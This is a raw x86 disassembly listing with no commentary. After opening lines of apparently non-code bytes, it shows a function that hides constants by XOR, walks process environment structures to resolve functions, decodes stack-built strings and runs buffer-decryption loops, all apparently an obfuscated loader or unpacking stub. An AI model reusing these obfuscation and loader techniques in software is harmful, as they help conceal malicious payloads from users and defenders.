  4248da:	sbb    DWORD PTR [ecx],ecx
  4248dc:	test   eax,0xfa19ba75
  4248e1:	push   esi
  4248e2:	sti    
  4248e3:	mov    bl,0xcd
  4248e5:	mov    BYTE PTR [edx+0x18906919],bl
  4248eb:	test   eax,0x919daab
  4248f0:	mov    bh,0xb8
  4248f2:	lds    esp,FWORD PTR [edi-0x22]
  4248f5:	mov    DWORD PTR [eax+0x47c5b530],edx
  4248fb:	mov    ah,0x6d
  4248fd:	mov    edx,0xe5560919
  424902:	mov    bh,0xf0
  424904:	outs   dx,DWORD PTR ds:[esi]
  424905:	mov    DWORD PTR [ecx-0x4bca7677],ebp
  42490b:	nop
  42490c:	xor    BYTE PTR [ebp-0x764172de],bl
  424912:	xchg   ebp,eax
  424913:	mov    WORD PTR [edi-0x6775e6c6],?
  424919:	nop
  42491a:	xor    al,0x9d
  42491c:	sub    eax,0x350919ba
  424921:	fldenv [esi+0x29]
  424924:	push   ebp
  424925:	add    BYTE PTR [ebx],al
  424927:	rol    BYTE PTR [ebx+0x6c8d01c0],0x24
  42492e:	inc    eax
  42492f:	ret    
  424930:	push   ebp
  424931:	mov    ebp,esp
  424933:	sub    esp,0x12c
  424939:	push   ebx
  42493a:	push   esi
  42493b:	push   edi
  42493c:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  424943:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42494a:	mov    eax,DWORD PTR [ebp+0x8]
  42494d:	mov    DWORD PTR [ebp+0x8],eax
  424950:	mov    ecx,DWORD PTR [ebp-0x10]
  424953:	mov    ebx,0x75108af
  424958:	xor    ecx,ebx
  42495a:	mov    eax,0x3272f6
  42495f:	add    ecx,eax
  424961:	mov    DWORD PTR [ebp-0x2c],ecx
  424964:	mov    ecx,DWORD PTR [ebp-0x10]
  424967:	xor    ecx,ebx
  424969:	add    ecx,eax
  42496b:	mov    DWORD PTR [ebp-0x3c],ecx
  42496e:	mov    ecx,DWORD PTR [ebp-0x10]
  424971:	xor    ecx,ebx
  424973:	add    ecx,eax
  424975:	mov    DWORD PTR [ebp-0x40],ecx
  424978:	mov    ecx,DWORD PTR [ebp-0x10]
  42497b:	xor    ecx,ebx
  42497d:	add    ecx,eax
  42497f:	mov    DWORD PTR [ebp-0xd8],ecx
  424985:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  42498c:	mov    DWORD PTR [ebp-0x40],0xf89cb5a5
  424993:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  42499a:	push   0x25
  42499c:	pop    ecx
  42499d:	mov    DWORD PTR [ebp-0x38],ecx
  4249a0:	mov    DWORD PTR [ebp-0x38],ecx
  4249a3:	push   0x65
  4249a5:	pop    ecx
  4249a6:	mov    DWORD PTR [ebp-0x38],ecx
  4249a9:	mov    DWORD PTR [ebp-0x38],ecx
  4249ac:	mov    DWORD PTR [ebp-0x38],0x4d
  4249b3:	mov    DWORD PTR [ebp-0x38],0x43
  4249ba:	mov    ecx,DWORD PTR [ebp-0x10]
  4249bd:	xor    ecx,ebx
  4249bf:	add    ecx,eax
  4249c1:	mov    DWORD PTR [ebp-0x38],ecx
  4249c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4249c7:	xor    ecx,ebx
  4249c9:	add    ecx,eax
  4249cb:	mov    DWORD PTR [ebp-0x38],ecx
  4249ce:	mov    DWORD PTR [ebp-0x28],0x258
  4249d5:	mov    DWORD PTR [ebp-0x20],0x36
  4249dc:	mov    DWORD PTR [ebp-0x14],0x7a
  4249e3:	lea    edi,[ebp-0x10c]
  4249e9:	lea    esi,[ebp-0x12c]
  4249ef:	call   0x4256b1
  4249f4:	dec    DWORD PTR [ebp-0x14]
  4249f7:	jne    0x4249e3
  4249f9:	dec    DWORD PTR [ebp-0x20]
  4249fc:	jne    0x4249dc
  4249fe:	dec    DWORD PTR [ebp-0x28]
  424a01:	jne    0x4249d5
  424a03:	mov    DWORD PTR [ebp-0x28],0x400e
  424a0a:	mov    eax,DWORD PTR [ebp-0x10]
  424a0d:	xor    eax,ebx
  424a0f:	mov    esi,0x3272f6
  424a14:	add    eax,esi
  424a16:	mov    DWORD PTR [ebp-0x1c],eax
  424a19:	mov    eax,DWORD PTR [ebp-0x10]
  424a1c:	and    DWORD PTR [ebp-0x94],0x0
  424a23:	xor    eax,ebx
  424a25:	add    eax,esi
  424a27:	mov    DWORD PTR [ebp-0x34],eax
  424a2a:	mov    eax,fs:0x18
  424a30:	mov    DWORD PTR [ebp-0x94],eax
  424a36:	mov    eax,DWORD PTR [eax+0x30]
  424a39:	mov    DWORD PTR [ebp-0xcc],eax
  424a3f:	mov    eax,DWORD PTR [eax+0xc]
  424a42:	mov    DWORD PTR [ebp-0xc0],eax
  424a48:	mov    eax,DWORD PTR [ebp+0x8]
  424a4b:	lea    ecx,[ebp-0x94]
  424a51:	mov    DWORD PTR [eax+0x1a0],ecx
  424a57:	mov    eax,DWORD PTR [ebp+0x8]
  424a5a:	lea    ecx,[ebp-0xcc]
  424a60:	mov    DWORD PTR [eax+0x1a4],ecx
  424a66:	mov    eax,DWORD PTR [ebp+0x8]
  424a69:	push   DWORD PTR [ebp+0x8]
  424a6c:	lea    ecx,[ebp-0xc0]
  424a72:	mov    DWORD PTR [eax+0x1a8],ecx
  424a78:	call   0x426e72
  424a7d:	mov    ecx,DWORD PTR [ebp-0x10]
  424a80:	xor    ecx,ebx
  424a82:	add    ecx,esi
  424a84:	cmp    ecx,eax
  424a86:	je     0x424e09
  424a8c:	mov    eax,DWORD PTR [ebp+0x8]
  424a8f:	mov    eax,DWORD PTR [eax+0x194]
  424a95:	mov    ecx,DWORD PTR [eax]
  424a97:	mov    eax,DWORD PTR [ebp+0x8]
  424a9a:	mov    eax,DWORD PTR [eax+0x194]
  424aa0:	mov    eax,DWORD PTR [eax]
  424aa2:	add    eax,DWORD PTR [ecx+0x3c]
  424aa5:	mov    ecx,DWORD PTR [ebp+0x8]
  424aa8:	mov    ecx,DWORD PTR [ecx+0x1e0]
  424aae:	lea    edx,[ebp-0xec]
  424ab4:	push   edx
  424ab5:	mov    edx,DWORD PTR [ebp+0x8]
  424ab8:	mov    edx,DWORD PTR [edx+0x18c]
  424abe:	mov    edx,DWORD PTR [edx]
  424ac0:	add    edx,DWORD PTR [eax+0x88]
  424ac6:	push   0x4
  424ac8:	push   DWORD PTR [eax+0x8c]
  424ace:	push   edx
  424acf:	call   DWORD PTR [ecx+0x1c]
  424ad2:	push   DWORD PTR [ebp+0x8]
  424ad5:	xor    eax,eax
  424ad7:	mov    DWORD PTR [ebp-0xa8],0x1b40103a
  424ae1:	mov    DWORD PTR [ebp-0xa4],0x14371122
  424aeb:	mov    DWORD PTR [ebp-0xa0],0x42111e0c
  424af5:	mov    BYTE PTR [ebp-0x9c],0x83
  424afc:	lea    edi,[ebp-0x9b]
  424b02:	stos   DWORD PTR es:[edi],eax
  424b03:	stos   WORD PTR es:[edi],ax
  424b05:	stos   BYTE PTR es:[edi],al
  424b06:	xor    eax,eax
  424b08:	mov    DWORD PTR [ebp-0xbc],0x1b40103a
  424b12:	mov    DWORD PTR [ebp-0xb8],0x14371122
  424b1c:	mov    DWORD PTR [ebp-0xb4],0x2c111e0c
  424b26:	mov    BYTE PTR [ebp-0xb0],0x83
  424b2d:	lea    edi,[ebp-0xaf]
  424b33:	stos   DWORD PTR es:[edi],eax
  424b34:	stos   WORD PTR es:[edi],ax
  424b36:	stos   BYTE PTR es:[edi],al
  424b37:	mov    edi,DWORD PTR [ebp+0x8]
  424b3a:	mov    eax,DWORD PTR [ebp+0x8]
  424b3d:	mov    edx,DWORD PTR [eax+0x1b8]
  424b43:	mov    DWORD PTR [ebp-0x68],0x110f1017
  424b4a:	mov    DWORD PTR [ebp-0x64],0x1a131620
  424b51:	mov    WORD PTR [ebp-0x60],0x8342
  424b57:	mov    DWORD PTR [ebp-0x90],0x1b40103a
  424b61:	mov    DWORD PTR [ebp-0x8c],0x17421122
  424b6b:	mov    DWORD PTR [ebp-0x88],0x35221b13
  424b75:	mov    DWORD PTR [ebp-0x84],0x111e160e
  424b7f:	mov    DWORD PTR [ebp-0x80],0x8342201a
  424b86:	mov    DWORD PTR [ebp-0x7c],0x1b40103a
  424b8d:	mov    DWORD PTR [ebp-0x78],0x17421122
  424b94:	mov    DWORD PTR [ebp-0x74],0x35221b13
  424b9b:	mov    DWORD PTR [ebp-0x70],0x111e160e
  424ba2:	mov    DWORD PTR [ebp-0x6c],0x832c201a
  424ba9:	call   0x426ea1
  424bae:	push   eax
  424baf:	mov    eax,DWORD PTR [ebp+0x8]
  424bb2:	mov    eax,DWORD PTR [eax+0x1a8]
  424bb8:	push   DWORD PTR [eax]
  424bba:	call   0x426b42
  424bbf:	test   eax,eax
  424bc1:	jne    0x424c13
  424bc3:	mov    eax,DWORD PTR [ebp+0x8]
  424bc6:	mov    eax,DWORD PTR [eax+0x1e0]
  424bcc:	mov    edi,DWORD PTR [ebp+0x8]
  424bcf:	add    eax,0x4
  424bd2:	mov    DWORD PTR [ebp-0x24],eax
  424bd5:	mov    eax,DWORD PTR [ebp+0x8]
  424bd8:	mov    edx,DWORD PTR [eax+0x1b8]
  424bde:	call   0x426ea1
  424be3:	push   eax
  424be4:	mov    eax,DWORD PTR [ebp-0x24]
  424be7:	call   DWORD PTR [eax]
  424be9:	test   eax,eax
  424beb:	jne    0x424c13
  424bed:	mov    eax,DWORD PTR [ebp+0x8]
  424bf0:	mov    eax,DWORD PTR [eax+0x1e0]
  424bf6:	mov    edi,DWORD PTR [ebp+0x8]
  424bf9:	add    eax,0x10
  424bfc:	mov    DWORD PTR [ebp-0x24],eax
  424bff:	mov    eax,DWORD PTR [ebp+0x8]
  424c02:	mov    edx,DWORD PTR [eax+0x1b8]
  424c08:	call   0x426ea1
  424c0d:	push   eax
  424c0e:	mov    eax,DWORD PTR [ebp-0x24]
  424c11:	call   DWORD PTR [eax]
  424c13:	mov    eax,DWORD PTR [ebp-0x10]
  424c16:	mov    ecx,DWORD PTR [ebp-0x28]
  424c19:	xor    eax,ebx
  424c1b:	add    eax,esi
  424c1d:	cmp    eax,ecx
  424c1f:	je     0x424de2
  424c25:	mov    eax,DWORD PTR [ebp-0x18]
  424c28:	xor    eax,ebx
  424c2a:	mov    ecx,0xffcd8d0a
  424c2f:	sub    ecx,eax
  424c31:	add    ecx,DWORD PTR [ebp-0x28]
  424c34:	mov    eax,DWORD PTR [ebp-0x1c]
  424c37:	cmp    eax,ecx
  424c39:	ja     0x424de2
  424c3f:	mov    DWORD PTR [ebp-0x20],0x0
  424c46:	push   DWORD PTR [ebp+0x8]
  424c49:	mov    edi,DWORD PTR [ebp+0x8]
  424c4c:	mov    eax,DWORD PTR [ebp+0x8]
  424c4f:	mov    edx,DWORD PTR [eax+0x1b4]
  424c55:	call   0x426ea1
  424c5a:	push   eax
  424c5b:	mov    eax,DWORD PTR [ebp+0x8]
  424c5e:	mov    eax,DWORD PTR [eax+0x1a8]
  424c64:	push   DWORD PTR [eax]
  424c66:	call   0x426b42
  424c6b:	mov    ecx,DWORD PTR [ebp+0x8]
  424c6e:	mov    ecx,DWORD PTR [ecx+0x19c]
  424c74:	mov    DWORD PTR [ecx],eax
  424c76:	mov    eax,DWORD PTR [ebp+0x8]
  424c79:	mov    edi,DWORD PTR [eax+0x1e0]
  424c7f:	mov    esi,DWORD PTR [ebp+0x8]
  424c82:	xor    eax,eax
  424c84:	lea    edx,[ebp-0x7c]
  424c87:	call   0x426ed7
  424c8c:	push   eax
  424c8d:	mov    eax,DWORD PTR [ebp+0x8]
  424c90:	mov    eax,DWORD PTR [eax+0x19c]
  424c96:	push   DWORD PTR [eax]
  424c98:	call   DWORD PTR [edi+0x8]
  424c9b:	mov    DWORD PTR [ebp-0x24],eax
  424c9e:	mov    eax,DWORD PTR [ebp+0x8]
  424ca1:	mov    edi,DWORD PTR [eax+0x1e0]
  424ca7:	mov    esi,DWORD PTR [ebp+0x8]
  424caa:	xor    eax,eax
  424cac:	lea    edx,[ebp-0x90]
  424cb2:	call   0x426ed7
  424cb7:	push   eax
  424cb8:	mov    eax,DWORD PTR [ebp+0x8]
  424cbb:	mov    eax,DWORD PTR [eax+0x19c]
  424cc1:	push   DWORD PTR [eax]
  424cc3:	call   DWORD PTR [edi+0x8]
  424cc6:	mov    eax,DWORD PTR [ebp+0x8]
  424cc9:	mov    edi,DWORD PTR [eax+0x1e0]
  424ccf:	mov    esi,DWORD PTR [ebp+0x8]
  424cd2:	xor    eax,eax
  424cd4:	lea    edx,[ebp-0xa8]
  424cda:	call   0x426ed7
  424cdf:	push   eax
  424ce0:	mov    eax,DWORD PTR [ebp+0x8]
  424ce3:	mov    eax,DWORD PTR [eax+0x19c]
  424ce9:	push   DWORD PTR [eax]
  424ceb:	call   DWORD PTR [edi+0x8]
  424cee:	and    DWORD PTR [ebp-0x8],0x0
  424cf2:	mov    DWORD PTR [ebp-0x44],eax
  424cf5:	mov    eax,DWORD PTR [ebp-0x8]
  424cf8:	and    eax,0x7
  424cfb:	add    eax,0x31
  424cfe:	push   eax
  424cff:	call   DWORD PTR [ebp-0x24]
  424d02:	test   eax,eax
  424d04:	je     0x424d48
  424d06:	mov    eax,DWORD PTR [ebp-0x8]
  424d09:	push   0x19
  424d0b:	xor    edx,edx
  424d0d:	pop    ecx
  424d0e:	div    ecx
  424d10:	add    dl,0x41
  424d13:	movzx  eax,dl
  424d16:	push   eax
  424d17:	call   DWORD PTR [ebp-0x44]
  424d1a:	test   eax,eax
  424d1c:	jne    0x424d48
  424d1e:	mov    eax,DWORD PTR [ebp+0x8]
  424d21:	mov    edi,DWORD PTR [eax+0x1e0]
  424d27:	mov    esi,DWORD PTR [ebp+0x8]
  424d2a:	xor    eax,eax
  424d2c:	lea    edx,[ebp-0x68]
  424d2f:	call   0x426ed7
  424d34:	push   eax
  424d35:	mov    eax,DWORD PTR [ebp+0x8]
  424d38:	mov    eax,DWORD PTR [eax+0x198]
  424d3e:	push   DWORD PTR [eax]
  424d40:	call   DWORD PTR [edi+0x8]
  424d43:	mov    DWORD PTR [ebp-0x14],eax
  424d46:	jmp    0x424d4c
  424d48:	and    DWORD PTR [ebp-0x14],0x0
  424d4c:	inc    DWORD PTR [ebp-0x8]
  424d4f:	cmp    DWORD PTR [ebp-0x8],0x10
  424d53:	jb     0x424cf5
  424d55:	mov    eax,DWORD PTR [ebp-0x18]
  424d58:	mov    esi,DWORD PTR [ebp+0x8]
  424d5b:	xor    eax,ebx
  424d5d:	mov    edi,0x3272f6
  424d62:	add    eax,edi
  424d64:	lea    edx,[ebp-0x10c]
  424d6a:	call   0x426ed7
  424d6f:	push   eax
  424d70:	mov    eax,DWORD PTR [ebp-0x10]
  424d73:	mov    esi,DWORD PTR [ebp+0x8]
  424d76:	xor    eax,ebx
  424d78:	add    eax,edi
  424d7a:	lea    edx,[ebp-0x12c]
  424d80:	call   0x426ed7
  424d85:	push   eax
  424d86:	call   DWORD PTR [ebp-0x14]
  424d89:	mov    ecx,DWORD PTR [ebp-0x10]
  424d8c:	xor    ecx,ebx
  424d8e:	add    ecx,edi
  424d90:	cmp    ecx,eax
  424d92:	jne    0x424d9b
  424d94:	mov    DWORD PTR [ebp-0x20],0x1
  424d9b:	mov    eax,DWORD PTR [ebp-0x18]
  424d9e:	mov    ecx,DWORD PTR [ebp-0x1c]
  424da1:	xor    eax,ebx
  424da3:	lea    eax,[eax+ecx*1+0x3272f6]
  424daa:	mov    DWORD PTR [ebp-0x1c],eax
  424dad:	mov    eax,DWORD PTR [ebp-0x20]
  424db0:	test   eax,eax
  424db2:	je     0x424dc6
  424db4:	mov    eax,DWORD PTR [ebp-0x18]
  424db7:	mov    ecx,DWORD PTR [ebp-0x34]
  424dba:	xor    eax,ebx
  424dbc:	lea    eax,[eax+ecx*1+0x3272f6]
  424dc3:	mov    DWORD PTR [ebp-0x34],eax
  424dc6:	mov    eax,DWORD PTR [ebp-0x18]
  424dc9:	xor    eax,ebx
  424dcb:	mov    ecx,0xffcd8d0a
  424dd0:	sub    ecx,eax
  424dd2:	add    ecx,DWORD PTR [ebp-0x28]
  424dd5:	mov    eax,DWORD PTR [ebp-0x1c]
  424dd8:	cmp    eax,ecx
  424dda:	jbe    0x424c3f
  424de0:	mov    esi,edi
  424de2:	mov    eax,DWORD PTR [ebp-0x34]
  424de5:	mov    ecx,DWORD PTR [ebp-0x1c]
  424de8:	cmp    ecx,eax
  424dea:	jne    0x424dfd
  424dec:	push   DWORD PTR [ebp+0x8]
  424def:	lea    eax,[ebp-0x3c]
  424df2:	push   eax
  424df3:	call   0x427946
  424df8:	mov    DWORD PTR [ebp-0x2c],eax
  424dfb:	jmp    0x424e09
  424dfd:	mov    eax,DWORD PTR [ebp-0x2c]
  424e00:	mov    ecx,DWORD PTR [ebp-0x18]
  424e03:	xor    ecx,ebx
  424e05:	add    ecx,esi
  424e07:	xor    DWORD PTR [eax],ecx
  424e09:	mov    eax,DWORD PTR [ebp-0x10]
  424e0c:	mov    ecx,DWORD PTR [ebp-0x2c]
  424e0f:	xor    eax,ebx
  424e11:	add    eax,esi
  424e13:	cmp    eax,ecx
  424e15:	je     0x42558f
  424e1b:	mov    eax,DWORD PTR [ebp-0x10]
  424e1e:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e21:	xor    eax,ebx
  424e23:	add    eax,esi
  424e25:	cmp    eax,ecx
  424e27:	je     0x42558f
  424e2d:	mov    eax,DWORD PTR [ebp-0x10]
  424e30:	xor    eax,ebx
  424e32:	add    eax,esi
  424e34:	jmp    0x424e52
  424e36:	mov    edi,DWORD PTR [ebp-0x2c]
  424e39:	mov    cl,al
  424e3b:	and    cl,0x1f
  424e3e:	or     dl,0xff
  424e41:	sub    dl,cl
  424e43:	add    BYTE PTR [edi+eax*1],dl
  424e46:	mov    ecx,DWORD PTR [ebp-0x18]
  424e49:	xor    ecx,ebx
  424e4b:	lea    eax,[eax+ecx*1+0x3272f6]
  424e52:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e55:	cmp    eax,ecx
  424e57:	jb     0x424e36
  424e59:	mov    eax,DWORD PTR [ebp-0x3c]
  424e5c:	mov    DWORD PTR [ebp-0x28],eax
  424e5f:	mov    eax,DWORD PTR [ebp-0x2c]
  424e62:	mov    DWORD PTR [ebp-0x34],0xf89c85a5
  424e69:	mov    DWORD PTR [ebp-0xd4],eax
  424e6f:	mov    edi,0xf89c85a4
  424e74:	mov    DWORD PTR [ebp-0x30],edi
  424e77:	mov    eax,DWORD PTR [ebp-0x34]
  424e7a:	xor    eax,ebx
  424e7c:	add    eax,esi
  424e7e:	mov    DWORD PTR [ebp-0xc],eax
  424e81:	mov    eax,DWORD PTR [ebp-0x34]
  424e84:	xor    eax,ebx
  424e86:	add    eax,esi
  424e88:	mov    DWORD PTR [ebp-0x8],eax
  424e8b:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  424e92:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  424e99:	mov    eax,DWORD PTR [ebp-0x34]
  424e9c:	mov    ecx,DWORD PTR [ebp-0x28]
  424e9f:	xor    eax,ebx
  424ea1:	add    eax,esi
  424ea3:	cmp    ecx,eax
  424ea5:	je     0x4250a4
  424eab:	jmp    0x425080
  424eb0:	mov    ecx,DWORD PTR [ebp-0xc]
  424eb3:	mov    eax,DWORD PTR [ebp-0x28]
  424eb6:	sub    eax,ecx
  424eb8:	mov    ecx,DWORD PTR [ebp-0x44]
  424ebb:	xor    ecx,ebx
  424ebd:	add    ecx,esi
  424ebf:	xor    edx,edx
  424ec1:	div    ecx
  424ec3:	mov    DWORD PTR [ebp-0x8],eax
  424ec6:	mov    eax,DWORD PTR [ebp-0x4c]
  424ec9:	mov    ecx,DWORD PTR [ebp-0x8]
  424ecc:	xor    eax,ebx
  424ece:	add    eax,esi
  424ed0:	cmp    ecx,eax
  424ed2:	jbe    0x424ede
  424ed4:	mov    eax,DWORD PTR [ebp-0x4c]
  424ed7:	xor    eax,ebx
  424ed9:	add    eax,esi
  424edb:	mov    DWORD PTR [ebp-0x8],eax
  424ede:	mov    eax,DWORD PTR [ebp-0x44]
  424ee1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ee4:	xor    eax,ebx
  424ee6:	add    eax,esi
  424ee8:	imul   eax,ecx
  424eeb:	mov    DWORD PTR [ebp-0x8],eax
  424eee:	mov    eax,DWORD PTR [ebp-0x34]
  424ef1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ef4:	xor    eax,ebx
  424ef6:	add    eax,esi
  424ef8:	cmp    ecx,eax
  424efa:	je     0x42506e
  424f00:	mov    eax,DWORD PTR [ebp-0x8]
  424f03:	mov    DWORD PTR [ebp-0x14],eax
  424f06:	mov    eax,DWORD PTR [ebp-0xc]
  424f09:	add    eax,DWORD PTR [ebp-0xd4]
  424f0f:	mov    DWORD PTR [ebp-0x24],0xf89c85a5
  424f16:	mov    DWORD PTR [ebp-0x20],edi
  424f19:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  424f23:	mov    DWORD PTR [ebp-0x8],eax
  424f26:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  424f2d:	mov    DWORD PTR [ebp-0x1c],edi
  424f30:	mov    eax,DWORD PTR [ebp-0x24]
  424f33:	xor    eax,ebx
  424f35:	add    eax,esi
  424f37:	jmp    0x42502d
  424f3c:	mov    DWORD PTR [ebp-0xe0],0xf89c85ba
  424f46:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  424f50:	mov    eax,DWORD PTR [ebp-0x1c]
  424f53:	mov    ecx,DWORD PTR [ebp-0x48]
  424f56:	xor    eax,ebx
  424f58:	add    eax,esi
  424f5a:	imul   eax,ecx
  424f5d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f60:	mov    al,BYTE PTR [eax+ecx*1]
  424f63:	mov    BYTE PTR [ebp-0x2],al
  424f66:	mov    eax,DWORD PTR [ebp-0x1c]
  424f69:	mov    ecx,DWORD PTR [ebp-0x48]
  424f6c:	xor    eax,ebx
  424f6e:	add    eax,esi
  424f70:	imul   eax,ecx
  424f73:	mov    ecx,DWORD PTR [ebp-0xe8]
  424f79:	xor    ecx,ebx
  424f7b:	add    eax,ecx
  424f7d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f80:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424f88:	mov    ecx,DWORD PTR [ebp-0xe0]
  424f8e:	xor    ecx,ebx
  424f90:	lea    eax,[ecx+eax*1+0x3272f6]
  424f97:	movzx  ecx,BYTE PTR [ebp-0x2]
  424f9b:	xor    ecx,eax
  424f9d:	mov    BYTE PTR [ebp-0x2],cl
  424fa0:	mov    al,BYTE PTR [ebp-0x2]
  424fa3:	mov    ecx,DWORD PTR [ebp-0x1c]
  424fa6:	mov    edx,DWORD PTR [ebp-0x48]
  424fa9:	xor    ecx,ebx
  424fab:	add    ecx,esi
  424fad:	imul   ecx,edx
  424fb0:	mov    edx,DWORD PTR [ebp-0x8]
  424fb3:	mov    BYTE PTR [ecx+edx*1],al
  424fb6:	mov    eax,DWORD PTR [ebp-0x1c]
  424fb9:	mov    ecx,DWORD PTR [ebp-0x48]
  424fbc:	xor    eax,ebx
  424fbe:	add    eax,esi
  424fc0:	imul   eax,ecx
  424fc3:	mov    ecx,DWORD PTR [ebp-0x8]
  424fc6:	mov    al,BYTE PTR [eax+ecx*1]
  424fc9:	mov    BYTE PTR [ebp-0x2],al
  424fcc:	mov    eax,DWORD PTR [ebp-0x1c]
  424fcf:	mov    ecx,DWORD PTR [ebp-0x48]
  424fd2:	xor    eax,ebx
  424fd4:	add    eax,esi
  424fd6:	imul   eax,ecx
  424fd9:	mov    ecx,DWORD PTR [ebp-0x20]
  424fdc:	xor    ecx,ebx
  424fde:	add    eax,ecx
  424fe0:	mov    ecx,DWORD PTR [ebp-0x8]
  424fe3:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424feb:	mov    ecx,DWORD PTR [ebp-0xc4]
  424ff1:	xor    ecx,ebx
  424ff3:	lea    eax,[ecx+eax*1+0x3272f6]
  424ffa:	movzx  ecx,BYTE PTR [ebp-0x2]
  424ffe:	xor    ecx,eax
  425000:	mov    BYTE PTR [ebp-0x2],cl
  425003:	mov    al,BYTE PTR [ebp-0x2]
  425006:	mov    ecx,DWORD PTR [ebp-0x1c]
  425009:	mov    edx,DWORD PTR [ebp-0x48]
  42500c:	xor    ecx,ebx
  42500e:	add    ecx,esi
  425010:	imul   ecx,edx
  425013:	mov    edx,DWORD PTR [ebp-0x8]
  425016:	mov    BYTE PTR [ecx+edx*1],al
  425019:	mov    eax,DWORD PTR [ebp-0x38]
  42501c:	mov    ecx,DWORD PTR [ebp-0x20]
  42501f:	xor    eax,ebx
  425021:	xor    ecx,ebx
  425023:	add    eax,esi
  425025:	add    ecx,esi
  425027:	imul   eax,ecx
  42502a:	add    eax,DWORD PTR [ebp-0x48]
  42502d:	mov    DWORD PTR [ebp-0x48],eax
  425030:	mov    eax,DWORD PTR [ebp-0x48]
  425033:	mov    ecx,DWORD PTR [ebp-0x14]
  425036:	cmp    ecx,eax
  425038:	jb     0x424f3c
  42503e:	mov    eax,DWORD PTR [ebp-0x20]
  425041:	mov    ecx,DWORD PTR [ebp-0x14]
  425044:	xor    eax,ebx
  425046:	add    eax,esi
  425048:	imul   eax,ecx
  42504b:	mov    ecx,DWORD PTR [ebp-0x24]
  42504e:	xor    ecx,ebx
  425050:	add    ecx,esi
  425052:	or     eax,ecx
  425054:	mov    ecx,DWORD PTR [ebp-0x30]
  425057:	xor    ecx,ebx
  425059:	add    eax,ecx
  42505b:	mov    ecx,DWORD PTR [ebp-0x30]
  42505e:	xor    ecx,ebx
  425060:	add    eax,ecx
  425062:	mov    ecx,DWORD PTR [ebp-0xc]
  425065:	lea    eax,[eax+ecx*1+0x64e5ec]
  42506c:	jmp    0x42507d
  42506e:	mov    eax,DWORD PTR [ebp-0x30]
  425071:	mov    ecx,DWORD PTR [ebp-0xc]
  425074:	xor    eax,ebx
  425076:	lea    eax,[eax+ecx*1+0x3272f6]
  42507d:	mov    DWORD PTR [ebp-0xc],eax
  425080:	mov    eax,DWORD PTR [ebp-0x30]
  425083:	xor    eax,ebx
  425085:	mov    ecx,0xffcd8d0a
  42508a:	sub    ecx,eax
  42508c:	add    ecx,DWORD PTR [ebp-0x28]
  42508f:	mov    eax,DWORD PTR [ebp-0x30]
  425092:	mov    edx,DWORD PTR [ebp-0xc]
  425095:	xor    eax,ebx
  425097:	add    eax,esi
  425099:	imul   eax,edx
  42509c:	cmp    eax,ecx
  42509e:	jbe    0x424eb0
  4250a4:	mov    eax,DWORD PTR [ebp-0x10]
  4250a7:	mov    ecx,DWORD PTR [ebp-0x3c]
  4250aa:	mov    eax,DWORD PTR [ebp+0x8]
  4250ad:	mov    edx,DWORD PTR [ebp-0x54]
  4250b0:	mov    eax,DWORD PTR [eax+0x1e0]
  4250b6:	xor    edx,ebx
  4250b8:	add    edx,esi
  4250ba:	push   edx
  4250bb:	mov    edx,DWORD PTR [ebp-0x40]
  4250be:	xor    edx,ebx
  4250c0:	add    edx,esi
  4250c2:	push   edx
  4250c3:	push   ecx
  4250c4:	mov    DWORD PTR [ebp-0x38],ecx
  4250c7:	mov    ecx,DWORD PTR [ebp-0x10]
  4250ca:	xor    ecx,ebx
  4250cc:	add    ecx,esi
  4250ce:	push   ecx
  4250cf:	call   DWORD PTR [eax+0x14]
  4250d2:	mov    edi,eax
  4250d4:	mov    eax,DWORD PTR [ebp-0x10]
  4250d7:	xor    eax,ebx
  4250d9:	add    eax,esi
  4250db:	cmp    eax,edi
  4250dd:	je     0x425138
  4250df:	mov    eax,DWORD PTR [ebp-0x10]
  4250e2:	jmp    0x425105
  4250e4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4250e7:	xor    eax,ebx
  4250e9:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f6]
  4250f0:	mov    BYTE PTR [eax+edi*1+0x3272f6],cl
  4250f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4250fa:	xor    ecx,ebx
  4250fc:	lea    eax,[ecx+eax*1+0x3272f6]
  425103:	xor    eax,ebx
  425105:	mov    ecx,DWORD PTR [ebp-0x3c]
  425108:	sub    ecx,esi
  42510a:	xor    ecx,ebx
  42510c:	cmp    eax,ecx
  42510e:	jne    0x4250e4
  425110:	mov    eax,DWORD PTR [ebp+0x8]
  425113:	mov    ecx,DWORD PTR [ebp-0x50]
  425116:	mov    eax,DWORD PTR [eax+0x1e0]
  42511c:	xor    ecx,ebx
  42511e:	add    ecx,esi
  425120:	push   ecx
  425121:	mov    ecx,DWORD PTR [ebp-0x10]
  425124:	xor    ecx,ebx
  425126:	add    ecx,esi
  425128:	push   ecx
  425129:	push   DWORD PTR [ebp-0x2c]
  42512c:	call   DWORD PTR [eax+0x18]
  42512f:	mov    eax,DWORD PTR [ebp-0x38]
  425132:	mov    DWORD PTR [ebp-0x2c],edi
  425135:	mov    DWORD PTR [ebp-0x3c],eax
  425138:	mov    eax,DWORD PTR [ebp-0x2c]
  42513b:	mov    DWORD PTR [ebp-0x14],eax
  42513e:	mov    eax,DWORD PTR [ebp-0x18]
  425141:	mov    ecx,DWORD PTR [ebp-0x10]
  425144:	xor    eax,ebx
  425146:	add    eax,esi
  425148:	mov    DWORD PTR [ebp-0x5c],0x422b332b
  42514f:	mov    DWORD PTR [ebp-0x58],0x382b402b
  425156:	jmp    0x425189
  425158:	mov    edx,DWORD PTR [ebp-0x14]
  42515b:	mov    edi,ecx
  42515d:	xor    edi,ebx
  42515f:	mov    cl,BYTE PTR [ebp+edi*1+0x32729a]
